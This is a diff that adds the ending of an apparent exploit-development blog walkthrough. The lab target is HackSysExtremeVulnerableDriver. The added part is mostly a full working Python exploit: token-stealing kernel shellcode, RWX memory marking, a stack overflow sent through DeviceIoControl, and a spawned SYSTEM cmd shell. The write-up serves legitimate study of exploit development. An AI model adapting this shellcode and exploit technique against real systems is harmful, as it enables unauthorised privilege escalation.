@@ -390,3 +390,117 @@ shellcode = shellcode + bytearray(
 This should run through clean and not crash the victim. Let's try it. 
 
 ![](/assets/images/AWE/clean.PNG)
+
+All is well! It ran right through, we hit our breakpoint, continued execution with `g` and we can see the Debuggee is still running and the victim has not crashed. All we have to do know is add shellcode.
+
+### Final Exploit 
+I used a slightly modified version of the Rootkit blog shellcode. Our final x86 exploit looks like this: 
+```python
+
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+import time
+
+kernel32 = windll.kernel32
+
+def create_file():
+
+    hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+    if (not hevd) or (hevd == -1):
+        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+        sys.exit(1)
+    else:
+        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+        return hevd
+
+def send_buf(hevd):
+
+    shellcode = bytearray(
+    "\x60"                            # pushad
+    "\x31\xc0"                        # xor eax,eax
+    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
+    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
+    "\x89\xc1"                        # mov ecx,eax
+    "\xba\x04\x00\x00\x00"            # mov edx,0x4
+    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
+    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
+    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
+    "\x75\xed"                        # jnz 0x1a
+    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
+    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
+    "\x61"                            # popad
+    "\x5d"
+    "\xc2\x08\x00")
+
+    print("[*] Allocating shellcode character array...")
+    usermode_addr = (c_char * len(shellcode)).from_buffer(shellcode)
+    ptr = addressof(usermode_addr)
+
+    print("[*] Marking shellcode RWX...")
+    
+    result = kernel32.VirtualProtect(
+        usermode_addr,
+        c_int(len(shellcode)),
+        c_int(0x40),
+        byref(c_ulong())
+    )
+
+    if result != 0:
+        print("[*] Successfully marked shellcode RWX.")
+    else:
+        print("[!] Failed to mark shellcode RWX.")
+        sys.exit(1)
+
+    payload = struct.pack("<L",ptr)
+
+    buf = "A" * 2080
+    buf += payload
+    buf_length = len(buf)
+    
+    print("[*] Sending payload to driver...")
+    result = kernel32.DeviceIoControl(
+        hevd,
+        0x222003,
+        buf,
+        buf_length,
+        None,
+        0,
+        byref(c_ulong()),
+        None
+    )
+
+    if result != 0:
+        print("[*] Payload sent.")
+    else:
+        print("[!] Unable to send payload to driver.")
+        sys.exit(1)
+
+    try:
+        print("[*] Spawning cmd shell with SYSTEM privs...")
+        Popen(
+            'start cmd',
+            shell=True
+        )
+    except:
+        print("[!] Failed to spawn cmd shell.")
+        sys.exit(1)
+
+hevd = create_file()
+send_buf(hevd)
+```
+
+The shellcode has been explained really well on Rootkit's blog, please go read it and understand what it's doing, we use a very similar shellcode approach when we port our exploit to x86-64. 
+
+## Conclusion
+That was tons of fun. The hardest parts for me were tracking down documentation on the API calls, tracking down documenation for the `ctypes` functions, and then walking through the shellcode. This was a great way to start learning WinDBG. With the different views available, it really doesn't feel that different from debuggers im used to. Next we will port this exploit to Windows 7 x86-64, which has some more curveballs. 
+
+Thanks to everyone mentioned in the blogpost, you've been hugely helpful I really appreciate everything. Truly. 
